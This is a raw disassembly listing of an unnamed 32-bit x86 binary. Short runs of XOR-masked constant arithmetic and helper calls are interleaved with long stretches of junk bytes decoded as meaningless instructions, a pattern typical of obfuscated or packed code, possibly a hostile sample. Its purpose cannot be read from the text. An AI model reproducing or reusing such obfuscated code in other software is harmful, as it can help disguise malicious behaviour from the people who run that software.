  41dd62:	out    0xe6,al
  41dd64:	mov    bh,0x4f
  41dd66:	sub    esp,DWORD PTR [edx-0x27]
  41dd69:	scas   al,BYTE PTR es:[edi]
  41dd6a:	adc    eax,0xdd4b2d7a
  41dd6f:	inc    edx
  41dd70:	sub    ecx,eax
  41dd72:	pop    eax
  41dd73:	sbb    BYTE PTR [edx-0xb],ch
  41dd76:	pop    ds
  41dd77:	mov    cl,0x30
  41dd79:	cld    
  41dd7a:	imul   edx,DWORD PTR [edx],0xf3d6c213
  41dd80:	sar    DWORD PTR [edx-0x6d],cl
  41dd83:	mov    ecx,cs
  41dd85:	and    eax,DWORD PTR [edx]
  41dd87:	mov    bh,0x33
  41dd89:	loopne 0x41dd1d
  41dd8b:	mov    bl,0x65
  41dd8d:	and    DWORD PTR [ebx+ebp*8+0x21],esi
  41dd91:	scas   eax,DWORD PTR es:[edi]
  41dd92:	mov    bh,BYTE PTR [ebp+ecx*1+0x6a]
  41dd96:	or     eax,0xdad9fea1
  41dd9b:	retf   
  41dd9c:	test   eax,0x8cefce4a
  41dda1:	mov    bl,0x48
  41dda3:	sahf   
  41dda4:	out    0xb4,eax
  41dda6:	or     DWORD PTR [eax+0x12],ebp
  41dda9:	xor    esi,ebx
  41ddab:	loope  0x41ddde
  41ddad:	push   ebx
  41ddae:	outs   dx,DWORD PTR ds:[esi]
  41ddaf:	pop    esp
  41ddb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddb1:	sub    al,0x9
  41ddb3:	mov    ecx,0x774736af
  41ddb8:	mov    ah,0xc2
  41ddba:	jg     0x41ddde
  41ddbc:	js     0x41dd41
  41ddbe:	push   edx
  41ddbf:	sahf   
  41ddc0:	xor    edx,edi
  41ddc2:	jmp    0x2b33:0x5a9bb107
  41ddc9:	sbb    BYTE PTR [esp+ecx*4-0x4c],dl
  41ddcd:	sub    ecx,DWORD PTR [edi+0xaf4a8ae]
  41ddd3:	jle    0x41de1d
  41ddd5:	jmp    0x41de48
  41ddd7:	xchg   ebx,eax
  41ddd8:	mov    bl,0xaf
  41ddda:	pop    esi
  41dddb:	mov    ecx,0x3479910d
  41dde0:	xor    ch,bh
  41dde2:	and    al,0x21
  41dde4:	test   al,0xe7
  41dde6:	xor    al,ch
  41dde8:	fnstcw WORD PTR [edx+0x61]
  41ddeb:	idiv   BYTE PTR [eax]
  41dded:	inc    ecx
  41ddee:	setl   ch
  41ddf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddf2:	lahf   
  41ddf3:	mov    ch,0xbf
  41ddf5:	jbe    0x41dd82
  41ddf7:	mov    ah,0x22
  41ddf9:	sbb    eax,DWORD PTR [esi+0x4d]
  41ddfc:	nop
  41ddfd:	adc    BYTE PTR [edi+0x3e71593b],cl
  41de03:	sbb    cl,al
  41de05:	mov    esp,0xe01161cb
  41de0a:	js     0x41dd92
  41de0c:	into   
  41de0d:	sbb    dl,BYTE PTR [esi]
  41de0f:	loop   0x41de08
  41de11:	add    al,0x88
  41de13:	shl    DWORD PTR [ebx+0x74d4fce5],cl
  41de19:	mov    bl,0x39
  41de1b:	jno    0x41de40
  41de1d:	aad    0x62
  41de1f:	sti    
  41de20:	mov    al,0xf3
  41de22:	xor    eax,0xcb79b576
  41de27:	xor    edx,0x9c2b8ae8
  41de2d:	mov    cl,0x2
  41de2f:	call   0x408bb8
  41de34:	mov    ecx,edx
  41de36:	mov    edx,DWORD PTR [ebp-0x15c]
  41de3c:	mov    DWORD PTR [ebp-0x218],esi
  41de42:	mov    esi,DWORD PTR [ebp-0x158]
  41de48:	xor    edx,0xcb79b576
  41de4e:	xor    esi,0x9c2b8ae8
  41de54:	mov    DWORD PTR [ebp-0x21c],eax
  41de5a:	mov    eax,edx
  41de5c:	mov    edx,esi
  41de5e:	mov    DWORD PTR [ebp-0x220],ecx
  41de64:	mov    cl,0x3e
  41de66:	call   0x4223ad
  41de6b:	mov    esi,DWORD PTR [ebp-0x21c]
  41de71:	or     esi,eax
  41de73:	mov    eax,DWORD PTR [ebp-0x220]
  41de79:	or     eax,edx
  41de7b:	push   eax
  41de7c:	push   esi
  41de7d:	push   ebx
  41de7e:	push   edi
  41de7f:	call   0x41594e
  41de84:	mov    esi,DWORD PTR [ebp-0x218]
  41de8a:	cmp    esi,eax
  41de8c:	jne    0x41df42
  41de92:	mov    eax,DWORD PTR [ebp-0x154]
  41de98:	mov    edx,DWORD PTR [ebp-0x150]
  41de9e:	xor    eax,0xcb79b576
  41dea3:	xor    edx,0x9c2b8ae8
  41dea9:	mov    cl,0x2
  41deab:	call   0x408bb8
  41deb0:	mov    esi,eax
  41deb2:	mov    edi,edx
  41deb4:	mov    eax,DWORD PTR [ebp-0x154]
  41deba:	mov    edx,DWORD PTR [ebp-0x150]
  41dec0:	xor    eax,0xcb79b576
  41dec5:	xor    edx,0x9c2b8ae8
  41decb:	mov    cl,0x3e
  41decd:	call   0x4223ad
  41ded2:	or     esi,eax
  41ded4:	or     edi,edx
  41ded6:	mov    eax,DWORD PTR [ebp-0x15c]
  41dedc:	mov    edx,DWORD PTR [ebp-0x158]
  41dee2:	xor    eax,0xcb79b576
  41dee7:	xor    edx,0x9c2b8ae8
  41deed:	mov    cl,0x2
  41deef:	call   0x408bb8
  41def4:	mov    ebx,eax
  41def6:	mov    eax,edx
  41def8:	mov    ecx,DWORD PTR [ebp-0x15c]
  41defe:	mov    edx,DWORD PTR [ebp-0x158]
  41df04:	xor    ecx,0xcb79b576
  41df0a:	xor    edx,0x9c2b8ae8
  41df10:	mov    DWORD PTR [ebp-0x224],eax
  41df16:	mov    eax,ecx
  41df18:	mov    cl,0x3e
  41df1a:	call   0x4223ad
  41df1f:	or     ebx,eax
  41df21:	mov    eax,DWORD PTR [ebp-0x224]
  41df27:	or     eax,edx
  41df29:	push   eax
  41df2a:	push   ebx
  41df2b:	push   edi
  41df2c:	push   esi
  41df2d:	call   0x41594e
  41df32:	mov    DWORD PTR [ebp-0x178],eax
  41df38:	jmp    0x41f19e
  41df3d:	jmp    0x41f154
  41df42:	lea    eax,[ebp-0x168]
  41df48:	mov    DWORD PTR [ebp-0x164],eax
  41df4e:	mov    eax,DWORD PTR [ebp-0x164]
  41df54:	mov    DWORD PTR [eax],0xa5069bae
  41df5a:	mov    eax,DWORD PTR [ebp-0x168]
  41df60:	xor    eax,0xa5069bae
  41df65:	shr    eax,0x2
  41df68:	mov    ecx,DWORD PTR [ebp-0x168]
  41df6e:	xor    ecx,0xa5069bae
  41df74:	shl    ecx,0x1e
  41df77:	or     eax,ecx
  41df79:	mov    ecx,DWORD PTR [ebp-0x174]
  41df7f:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  41df83:	mov    DWORD PTR [ebp-0x160],eax
  41df89:	mov    esi,DWORD PTR [ebp-0x160]
  41df8f:	mov    eax,DWORD PTR [ebp-0x154]
  41df95:	mov    edx,DWORD PTR [ebp-0x150]
  41df9b:	xor    eax,0xcb79b576
  41dfa0:	xor    edx,0x9c2b8ae8
  41dfa6:	mov    cl,0x2
  41dfa8:	call   0x408bb8
  41dfad:	mov    edi,eax
  41dfaf:	mov    ebx,edx
  41dfb1:	mov    eax,DWORD PTR [ebp-0x154]
  41dfb7:	jmp    0x41e39e
  41dfbc:	mov    bl,0xa1
  41dfbe:	mov    eax,ds:0xbba5b3a5
  41dfc3:	mov    ebx,0xd1567b79
  41dfc8:	icebp  
  41dfc9:	mov    dl,0xb6
  41dfcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfcc:	nop
  41dfcd:	pop    edi
  41dfce:	sar    BYTE PTR [esi-0x41413bb6],0x48
  41dfd5:	stos   DWORD PTR es:[edi],eax
  41dfd6:	test   al,0x91
  41dfd8:	mov    ebp,0xbe49998d
  41dfdd:	push   ebp
  41dfde:	loop   0x41df84
  41dfe0:	sar    DWORD PTR [edi-0x42],1
  41dfe3:	pop    eax
  41dfe4:	dec    esp
  41dfe5:	cmp    eax,edi
  41dfe7:	or     dl,ah
  41dfe9:	push   eax
  41dfea:	dec    esi
  41dfeb:	call   0x8e7c:0x2a70f53c
  41dff2:	mov    ds:0xb4acf660,eax
  41dff7:	mov    ebp,0x976bd27e
  41dffc:	xor    ch,al
  41dffe:	sbb    al,0x26
  41e000:	inc    ecx
  41e001:	mov    WORD PTR [eax-0x2ff60017],?
  41e007:	int    0x52
  41e009:	and    BYTE PTR [edx],0x2e
  41e00c:	xor    BYTE PTR [edi+edx*2+0x6de99398],0x4b
  41e014:	mov    ds:0xfa14ef58,al
  41e019:	sbb    eax,0xffb6dc71
  41e01e:	or     ah,bh
  41e020:	inc    eax
  41e021:	ds ins DWORD PTR es:[edi],dx
  41e023:	xor    cl,BYTE PTR [esi-0x5f]
  41e026:	push   ecx
  41e027:	mov    esi,0xff3396aa
  41e02c:	cmp    bh,BYTE PTR [edx+0x6e]
  41e02f:	pop    esi
  41e030:	cdq    
  41e031:	sbb    al,0x29
  41e033:	adc    DWORD PTR [edi-0x70],eax
  41e036:	(bad)  
  41e037:	xlat   BYTE PTR ds:[ebx]
  41e038:	test   eax,0x2974b6e6
  41e03d:	int    0x2a
  41e03f:	mov    fs,edx
  41e041:	xchg   esp,ebx
  41e043:	or     eax,0x172c0e78
  41e048:	ds inc ebx
  41e04a:	iret   
  41e04b:	fcomp  QWORD PTR [ecx]
  41e04d:	xor    cl,BYTE PTR [esp+esi*4+0x34]
  41e051:	jl     0x41e023
  41e053:	jno    0x41dfe5
  41e055:	lods   al,BYTE PTR ds:[esi]
  41e056:	xchg   BYTE PTR [ebx+0x43b31f5a],ah
  41e05c:	add    cl,cl
  41e05e:	rcr    BYTE PTR [eax-0x79108513],0x8a
  41e065:	aas    
  41e066:	out    dx,eax
  41e067:	add    al,0x3d
  41e069:	fimul  WORD PTR gs:0x78bd22fc
  41e070:	lods   eax,DWORD PTR ds:[esi]
  41e071:	jne    0x41e0b7
  41e073:	mov    ds,WORD PTR [esi-0x1bbde2ed]
  41e079:	lods   eax,DWORD PTR ds:[esi]
  41e07a:	adc    ebp,edi
  41e07c:	xor    eax,0xad2c88a6
  41e081:	dec    edi
  41e082:	sbb    edx,DWORD PTR [edi]
  41e084:	or     DWORD PTR [esi+0x5ff5a3ad],esi
  41e08a:	out    dx,eax
  41e08b:	fild   DWORD PTR [ebx]
  41e08d:	mov    esi,0x2420dd0
  41e092:	in     eax,0x97
  41e094:	outs   dx,BYTE PTR ds:[esi]
  41e095:	push   esi
  41e096:	and    DWORD PTR [esi+0x22],esp
  41e099:	add    al,ch
  41e09b:	scas   al,BYTE PTR es:[edi]
  41e09c:	mov    dl,0xfe
  41e09f:	sbb    edx,ebp
  41e0a1:	imul   ebp,DWORD PTR [ecx],0x40
  41e0a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0a5:	xchg   esi,eax
  41e0a6:	xlat   BYTE PTR ds:[ebx]
  41e0a7:	xchg   edx,eax
  41e0a8:	loop   0x41e0e4
  41e0aa:	and    esp,DWORD PTR [esi+0x35118e93]
  41e0b0:	inc    edx
  41e0b1:	mov    bl,0x85
  41e0b3:	xchg   esi,eax
  41e0b4:	jp     0x41e0e0
  41e0b6:	mov    bh,0x30
  41e0b8:	inc    esi
  41e0b9:	add    cl,al
  41e0bb:	push   edi
  41e0bc:	add    al,0x5c
  41e0be:	ss xor al,0x29
  41e0c1:	jno    0x41e121
  41e0c3:	ins    DWORD PTR es:[edi],dx
  41e0c4:	lea    ebp,[eax+ebp*1]
  41e0c7:	mov    edi,0xecba8feb
  41e0cc:	leave  
  41e0cd:	fnstenv [edx+ebx*2-0x3b02c771]
  41e0d4:	neg    DWORD PTR [ebx-0x7b]
  41e0d7:	cli    
  41e0d8:	mov    dl,0x7f
  41e0da:	std    
  41e0db:	inc    edx
  41e0dc:	mov    ebp,0xe6ee2b8c
  41e0e1:	cmc    
  41e0e2:	repz jp 0x41e095
  41e0e5:	stos   BYTE PTR es:[edi],al
  41e0e6:	xor    ch,BYTE PTR [ecx+0x3a28ef79]
  41e0ec:	sbb    DWORD PTR [ebp-0x5178fd2a],ebp
  41e0f2:	sar    BYTE PTR [edx],cl
  41e0f4:	aas    
  41e0f5:	mov    ebx,0x7f7e358
  41e0fa:	(bad)  
  41e0fb:	mov    bh,0x95
  41e0fd:	cs xor BYTE PTR ss:[edx],bh
  41e101:	adc    ecx,DWORD PTR [esi+0x29]
  41e104:	add    dl,cl
  41e106:	and    ebp,ebp
  41e108:	out    0xcd,eax
  41e10a:	push   es
  41e10b:	jb     0x41e0a1
  41e10d:	xchg   ebx,eax
  41e10e:	pop    ecx
  41e10f:	mov    esp,0x7d48c958
  41e114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e115:	add    BYTE PTR [eax+0x2],al
  41e118:	push   es
  41e119:	sbb    eax,0xb6c175c8
  41e11e:	loope  0x41e17b
  41e120:	jns    0x41e19c
  41e122:	cdq    
  41e123:	aaa    
  41e124:	scas   al,BYTE PTR es:[edi]
  41e125:	push   ds
  41e126:	fs pop ds
  41e128:	mov    BYTE PTR [ebx],bh
  41e12a:	pop    ds
  41e12b:	jmp    0x3723a275
  41e130:	hlt    
  41e131:	inc    edi
  41e132:	xchg   edi,eax
  41e133:	jb     0x41e13e
  41e135:	mov    ah,BYTE PTR [edi-0x35]
  41e138:	add    dh,al
  41e13a:	je     0x41e137
  41e13c:	jecxz  0x41e190
  41e13e:	cmp    BYTE PTR [ecx+0x478e3f94],dl
  41e144:	or     BYTE PTR [ecx+edx*1+0x2b803d76],dl
  41e14b:	(bad)  
  41e14c:	jmp    0x41e0d0
  41e14e:	mov    esi,0xf8632b70
  41e153:	xor    bh,dh
  41e155:	sbb    BYTE PTR [ecx-0x63be09a3],al
  41e15b:	sbb    DWORD PTR [eax+0x75dbf71b],0xb
  41e162:	outs   dx,DWORD PTR ds:[esi]
  41e163:	jo     0x41e11f
  41e165:	fiadd  DWORD PTR [esi+0x1f33a2cf]
  41e16b:	ja     0x41e183
  41e16d:	call   FWORD PTR [ecx-0x79aab11a]
  41e173:	scas   eax,DWORD PTR es:[edi]
  41e174:	inc    edx
  41e175:	pop    edx
  41e176:	sub    bh,BYTE PTR [edx-0x60]
  41e179:	mov    bl,0xef
  41e17b:	pop    eax
  41e17c:	das    
  41e17d:	cmp    al,0x2a
  41e180:	xor    edx,esp
  41e182:	jmp    0x4a29399e
  41e187:	pop    edi
  41e188:	enter  0xffa,0xe2
  41e18c:	fsub   DWORD PTR [edi+0x2d71793d]
  41e192:	inc    eax
  41e193:	jl     0x41e16d
  41e195:	dec    ecx
  41e196:	mov    esi,0xbb10567a
  41e19b:	test   BYTE PTR ds:0xdf66245a,bh
  41e1a1:	popa   
  41e1a2:	mov    ecx,0xacba6dce
  41e1a7:	pop    ss
  41e1a8:	push   esi
  41e1a9:	enter  0x162,0x11
  41e1ad:	imul   edi,esp,0x2b
  41e1b0:	test   BYTE PTR [edx-0x1b532f6b],al
  41e1b6:	xchg   ecx,eax
  41e1b7:	or     BYTE PTR [ebx+0x735244de],bl
  41e1bd:	je     0x41e187
  41e1bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1c0:	pop    ebx
  41e1c1:	imul   esi
  41e1c3:	cli    
  41e1c4:	(bad)  
  41e1c5:	adc    eax,0x650c7962
  41e1ca:	add    ch,ch
  41e1cc:	pop    esp
  41e1cd:	mov    eax,DWORD PTR [esi-0x50263716]
  41e1d3:	pop    ss
  41e1d4:	jp     0x41e18e
  41e1d6:	dec    edx
  41e1d7:	lock sub BYTE PTR [ecx],bl
  41e1da:	pop    ebx
  41e1db:	sub    al,0x24
  41e1dd:	sbb    eax,0xd83b215f
  41e1e2:	jp     0x41e166
  41e1e4:	ret    
  41e1e5:	mov    ch,ch
  41e1e7:	mov    ch,0xa0
  41e1e9:	dec    ebp
  41e1ea:	sti    
  41e1eb:	mov    ah,0xef
  41e1ed:	adc    al,0x27
  41e1ef:	sbb    al,0xe5
  41e1f1:	and    esi,DWORD PTR [ebp-0x1139ae76]
  41e1f7:	lahf   
  41e1f8:	(bad)  
  41e1fa:	or     eax,0x6ac2771a
  41e1ff:	jmp    0x11e1:0xe8e40a31
  41e206:	cwde   
  41e207:	(bad)  
  41e208:	in     eax,0xba
  41e20a:	cmp    al,0x36
  41e20c:	clc    
  41e20d:	or     al,0xb6
  41e20f:	or     ebp,ebx
  41e211:	(bad)  [ecx+eiz*1-0x2b75801a]
  41e218:	inc    ecx
  41e219:	adc    eax,0x1a377c5e
  41e21e:	inc    edx
  41e21f:	add    DWORD PTR [esi+0x39e4fad3],edx
  41e225:	test   eax,0xdd5382eb
  41e22a:	mov    bh,0x7e
  41e22c:	repnz sar DWORD PTR [esi-0x5d73b9a6],1
  41e233:	arpl   WORD PTR [eax-0x1e],si
  41e236:	pop    cx
  41e238:	add    cl,BYTE PTR [edx+0x56f7d1b]
  41e23e:	(bad)  
  41e23f:	pop    ebp
  41e240:	aam    0xfc
  41e242:	pusha  
  41e243:	cld    
  41e244:	jns    0x41e278
  41e246:	stc    
  41e247:	fwait
  41e248:	xchg   ebp,eax
  41e249:	pop    ecx
  41e24a:	xchg   esi,eax
  41e24b:	rol    dh,cl
  41e24d:	out    0x29,eax
  41e24f:	bound  ebp,QWORD PTR [ecx-0x7a031d4c]
  41e255:	loope  0x41e1f3
  41e257:	(bad)  
  41e258:	mov    ebp,edi
  41e25a:	mov    esp,0x4b529bfc
  41e25f:	cmp    BYTE PTR [esi-0x48],bl
  41e262:	(bad)  
  41e263:	stos   BYTE PTR es:[edi],al
  41e264:	scas   eax,DWORD PTR es:[edi]
  41e265:	mov    ds:0x760c6ce5,eax
  41e26a:	pop    esp
  41e26b:	and    BYTE PTR cs:[ebx+edx*1-0x523debe2],ch
  41e273:	ss xchg edx,eax
  41e275:	cmc    
  41e276:	adc    edi,DWORD PTR [ecx-0x48]
  41e279:	push   esp
  41e27a:	mov    ds:0x9d3f5b78,eax
  41e27f:	mov    cl,0x68
  41e281:	and    esi,DWORD PTR [eax-0x57]
  41e284:	inc    ecx
  41e285:	sar    BYTE PTR [edx-0x5dd4461f],1
  41e28b:	adc    ebx,DWORD PTR [edi]
  41e28d:	ins    DWORD PTR es:[edi],dx
  41e28e:	cmp    ch,BYTE PTR [edi]
  41e290:	test   al,0x0
  41e292:	sbb    ch,BYTE PTR [edi]
  41e294:	xchg   edx,eax
  41e295:	pop    ebx
  41e296:	pop    ds
  41e297:	dec    edx
  41e298:	adc    dh,BYTE PTR [edi]
  41e29a:	mov    ah,0x5b
  41e29c:	fild   QWORD PTR [edi-0x483cf73b]
  41e2a2:	test   BYTE PTR [ebx],al
  41e2a4:	adc    al,0x58
  41e2a6:	xrelease xchg DWORD PTR [edx+0x3be05e82],eax
  41e2ad:	add    DWORD PTR [ecx-0xc8188b],ecx
  41e2b3:	jns    0x41e2d3
  41e2b5:	cmc    
  41e2b6:	arpl   WORD PTR [edi+0x7d],si
  41e2b9:	addr16 sbb esi,edx
  41e2bc:	cmc    
  41e2bd:	rcl    BYTE PTR [edi+0x1991c424],cl
  41e2c3:	sbb    DWORD PTR [ebp-0x18],0x7782622c
  41e2ca:	push   ss
  41e2cb:	icebp  
  41e2cc:	xor    ah,al
  41e2ce:	sbb    ebx,esp
  41e2d0:	or     bh,BYTE PTR [edx]
  41e2d2:	fcomp  QWORD PTR [ecx]
  41e2d4:	mov    ecx,0x3b736f2c
  41e2d9:	mov    DWORD PTR [ebp-0x59],0x573b507b
  41e2e0:	pop    esp
  41e2e1:	aam    0xe2
  41e2e3:	cmp    eax,0x3ef479f4
  41e2e8:	xchg   edx,eax
  41e2e9:	shl    DWORD PTR [esi+ebx*4],0x41
  41e2ed:	sub    al,0xba
  41e2ef:	sbb    bl,dh
  41e2f1:	rcl    ah,1
  41e2f3:	lods   al,BYTE PTR ds:[esi]
  41e2f4:	adc    DWORD PTR [esi+edx*1-0x4c9268],eax
  41e2fb:	sub    eax,0xa05932a7
  41e300:	push   0xfb1ac206
  41e305:	and    eax,0x3e925030
  41e30a:	cmp    esp,ebp
  41e30c:	mov    ebp,0x96e0a6b2
  41e311:	inc    ebp
  41e312:	or     al,0x5b
  41e314:	mov    DWORD PTR [eax-0x79a33966],ebx
  41e31a:	mov    WORD PTR [eax+ecx*8],cs
  41e31d:	mov    ebp,DWORD PTR [esi+0x13]
  41e320:	leave  
  41e321:	jo     0x41e395
  41e323:	inc    ebp
  41e324:	jnp    0x41e2c1
  41e326:	or     al,0xe2
  41e328:	int    0x5e
  41e32a:	call   0xd72d0c24
  41e32f:	push   edx
  41e330:	xchg   esp,eax
  41e331:	dec    BYTE PTR [ecx+0x1a]
  41e334:	hlt    
  41e335:	xor    cl,BYTE PTR [ebx+0x4c586e93]
  41e33b:	mov    ah,BYTE PTR [ecx+0x40323883]
  41e341:	mov    dl,0x99
  41e343:	ret    0xf38c
  41e346:	nop
  41e347:	inc    edx
  41e348:	das    
  41e349:	and    esp,DWORD PTR [ebp+0x23]
  41e34c:	mov    ecx,0x1085c28f
  41e351:	nop
  41e352:	cdq    
  41e353:	repnz pop ebp
  41e355:	xor    eax,0x7642ba8f
  41e35a:	inc    BYTE PTR [esi]
  41e35c:	push   eax
  41e35d:	jp     0x41e368
  41e35f:	dec    esp
  41e360:	jl     0x41e392
  41e362:	jp     0x41e2e9
  41e364:	sbb    al,dh
  41e366:	and    ch,ch
  41e368:	rcr    ah,cl
  41e36a:	mov    edx,0x1200c046
  41e36f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e370:	pop    ecx
  41e371:	or     BYTE PTR [esi-0x6e],bl
  41e374:	dec    esi
  41e375:	cmp    edi,DWORD PTR [edx-0x2a]
  41e378:	mov    dl,0x15
  41e37a:	xchg   esi,eax
  41e37b:	jbe    0x41e3eb
  41e37d:	inc    esi
  41e37e:	(bad)  
  41e37f:	jp     0x41e32d
  41e381:	jb     0x41e338
  41e383:	ja     0x41e35f
  41e385:	iret   
  41e386:	repnz popf 
  41e388:	out    0x94,eax
  41e38a:	and    DWORD PTR [edi+0x932211],0xffffffc9
  41e391:	pop    esi
  41e392:	jp     0x41e40a
  41e394:	mov    ch,0xc7
  41e396:	mov    ebp,0x9158431d
  41e39b:	fcom   DWORD PTR [edx+ebp*8-0x75]
  41e39f:	xchg   ebp,eax
  41e3a0:	mov    al,0xfe
  41e3a2:	(bad)  
  41e3a3:	push   DWORD PTR ds:0xcb79b576
  41e3a9:	xor    edx,0x9c2b8ae8
  41e3af:	mov    cl,0x3e
  41e3b1:	call   0x4223ad
  41e3b6:	or     edi,eax
  41e3b8:	or     ebx,edx
  41e3ba:	mov    eax,DWORD PTR [ebp-0x15c]
  41e3c0:	mov    edx,DWORD PTR [ebp-0x158]
  41e3c6:	xor    eax,0xcb79b576
  41e3cb:	xor    edx,0x9c2b8ae8
  41e3d1:	mov    cl,0x2
  41e3d3:	call   0x408bb8
  41e3d8:	mov    ecx,edx
  41e3da:	mov    edx,DWORD PTR [ebp-0x15c]
  41e3e0:	mov    DWORD PTR [ebp-0x228],esi
  41e3e6:	mov    esi,DWORD PTR [ebp-0x158]
  41e3ec:	xor    edx,0xcb79b576
  41e3f2:	xor    esi,0x9c2b8ae8
  41e3f8:	mov    DWORD PTR [ebp-0x22c],eax
  41e3fe:	mov    eax,edx
  41e400:	mov    edx,esi
  41e402:	mov    DWORD PTR [ebp-0x230],ecx
  41e408:	mov    cl,0x3e
  41e40a:	call   0x4223ad
  41e40f:	mov    esi,DWORD PTR [ebp-0x22c]
  41e415:	or     esi,eax
  41e417:	mov    eax,DWORD PTR [ebp-0x230]
  41e41d:	or     eax,edx
  41e41f:	push   eax
  41e420:	push   esi
  41e421:	jmp    0x41e808
  41e426:	rcl    BYTE PTR [ebp+0x47],cl
  41e429:	cmp    ecx,DWORD PTR [ebx+0x3b]
  41e42c:	mov    cl,0xb7
  41e42e:	scas   eax,DWORD PTR es:[edi]
  41e42f:	xor    ebx,DWORD PTR [ecx+edx*8]
  41e432:	mov    ebp,0x1c9e0e63
  41e437:	sar    BYTE PTR [bp-0x3bb6],0xbe
  41e43d:	mov    esi,0x8b0c6018
  41e442:	mov    edi,0x2e054881
  41e447:	adc    al,BYTE PTR [edx+0x1d]
  41e44a:	(bad)  
  41e44c:	xor    BYTE PTR [edi],dh
  41e44e:	fnsave [edi]
  41e450:	xchg   ebp,eax
  41e451:	mov    cl,0xd0
  41e453:	pop    eax
  41e454:	aas    
  41e455:	or     bl,bl
  41e457:	ficom  DWORD PTR [ebx]
  41e459:	jns    0x41e4a5
  41e45b:	cli    
  41e45c:	dec    ebx
  41e45d:	iret   
  41e45e:	sbb    ebx,0x6c
  41e461:	sub    al,BYTE PTR [esi+0x19]
  41e464:	adc    edx,DWORD PTR [ebp-0x60]
  41e467:	mov    edi,0x4494e07f
  41e46c:	lods   eax,DWORD PTR ds:[esi]
  41e46d:	in     al,0xbe
  41e46f:	call   0x3b9:0x20e3e908
  41e476:	mov    ds:0xbafef812,eax
  41e47b:	jnp    0x41e4a4
  41e47d:	ud1    esi,edi
  41e480:	dec    ebp
  41e481:	add    BYTE PTR [eax],ch
  41e483:	xchg   DWORD PTR [ecx+eax*1-0x707b031c],ebx
  41e48a:	dec    ebp
  41e48b:	add    eax,0x7b0273df
  41e490:	outs   dx,DWORD PTR ds:[esi]
  41e491:	adc    edi,DWORD PTR [eax]
  41e493:	mov    eax,ds:0xdf3816ec
  41e498:	ins    BYTE PTR es:[edi],dx
  41e499:	sub    ebp,DWORD PTR [edx]
  41e49b:	jmp    0x9327a9e
  41e4a0:	or     DWORD PTR [edi-0x3027e89f],eax
  41e4a6:	outs   dx,DWORD PTR ds:[esi]
  41e4a7:	sub    dh,BYTE PTR [esi-0xa9030d7]
  41e4ad:	loope  0x41e522
  41e4af:	adc    ah,dl
  41e4b1:	and    BYTE PTR [eax+esi*2+0x56],ah
  41e4b5:	cs sbb al,0xa5
  41e4b8:	ja     0x41e49b
  41e4ba:	pop    ds
  41e4bb:	(bad)  
  41e4bc:	leave  
  41e4bd:	sub    DWORD PTR [eax+0x4d664a86],ebp
  41e4c3:	sbb    BYTE PTR [eax],0xf9
  41e4c6:	rcl    BYTE PTR [ebx],1
  41e4c8:	idiv   DWORD PTR ds:0xc7229779
  41e4ce:	ds call 0xd5dd7547
  41e4d4:	xlat   BYTE PTR ds:[ebx]
  41e4d5:	icebp  
  41e4d6:	mov    edx,0xbf7e0084
  41e4db:	jnp    0x41e4b6
  41e4dd:	pop    ebx
  41e4de:	add    eax,0xa18a7dbb
  41e4e3:	rol    BYTE PTR [ebp-0x3bff43fe],cl
  41e4e9:	mov    ds:0xcbc41544,eax
  41e4ee:	sahf   
  41e4ef:	jmp    0x41e557
  41e4f1:	vmwrite esp,ebx
  41e4f4:	aam    0x8a
  41e4f6:	cmp    ah,al
  41e4f8:	loope  0x41e546
  41e4fa:	push   es
  41e4fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4fc:	add    bl,dl
  41e4fe:	lea    esi,[edi]
  41e500:	inc    ebp
  41e501:	sub    al,0xb3
  41e503:	pop    edx
  41e504:	push   cs
  41e505:	and    cl,BYTE PTR [ebp+0x1cbaa45]
  41e50b:	popf   
  41e50c:	jae    0x41e549
  41e50e:	or     eax,edi
  41e510:	fs out dx,al
  41e512:	mov    ecx,0xfaad1f45
  41e517:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41e519:	outs   dx,DWORD PTR ds:[esi]
  41e51a:	jo     0x41e4ea
  41e51c:	rcr    BYTE PTR [ecx],1
  41e51e:	and    DWORD PTR [esi+0x605416bb],ebp
  41e524:	fs mov ah,0x49
  41e527:	mov    bl,0xc7
  41e529:	mov    al,ds:0xd86ee95a
  41e52e:	(bad)  
  41e52f:	mov    edx,0x697cbe24
  41e534:	fldcw  WORD PTR [edi]
  41e536:	sub    ecx,ecx
  41e538:	mov    bl,0xc3
  41e53a:	sti    
  41e53b:	jbe    0x41e4d6
  41e53d:	fdivrp st(6),st
  41e53f:	and    bl,BYTE PTR [esi+0x7d0508b0]
  41e545:	adc    ch,cl
  41e547:	popa   
  41e548:	sbb    al,0x6a
  41e54a:	outs   dx,DWORD PTR ds:[si]
  41e54c:	inc    ebx
  41e54d:	jmp    0x41e549
  41e54f:	mov    WORD PTR [esi],?
  41e551:	xor    ecx,DWORD PTR [edi-0x5]
  41e554:	arpl   WORD PTR [ebx+0x68],ax
  41e557:	out    0x5a,eax
  41e559:	(bad)  
  41e55a:	xor    BYTE PTR [esi-0x13],bh
  41e55d:	scas   al,BYTE PTR es:[edi]
  41e55e:	retf   
  41e55f:	pop    edi
  41e560:	pop    ebp
  41e561:	ret    0xf795
  41e564:	(bad)  
  41e565:	outs   dx,DWORD PTR ds:[esi]
  41e566:	and    DWORD PTR fs:[edi+edx*4+0x77],ebx
  41e56b:	mov    ds:0x6f19c142,al
  41e570:	ror    BYTE PTR [eax-0x61984538],0xc0
  41e577:	daa    
  41e578:	in     al,dx
  41e579:	xor    eax,0xe8f28a93
  41e57e:	lea    ebp,[ebp-0x8b219c]
  41e584:	inc    ebx
  41e585:	jne    0x41e5b3
  41e587:	test   eax,0x9601752d
  41e58c:	push   esp
  41e58d:	jecxz  0x41e5dd
  41e58f:	mov    cl,al
  41e591:	push   ecx
  41e592:	jne    0x41e597
  41e594:	mov    esp,0xaf5f6a8b
  41e599:	in     eax,0xdc
  41e59b:	sub    eax,0x88bd20e1
  41e5a0:	daa    
  41e5a1:	cmp    eax,DWORD PTR [edi+0x19d950df]
  41e5a7:	jns    0x41e5cd
  41e5a9:	jle    0x41e560
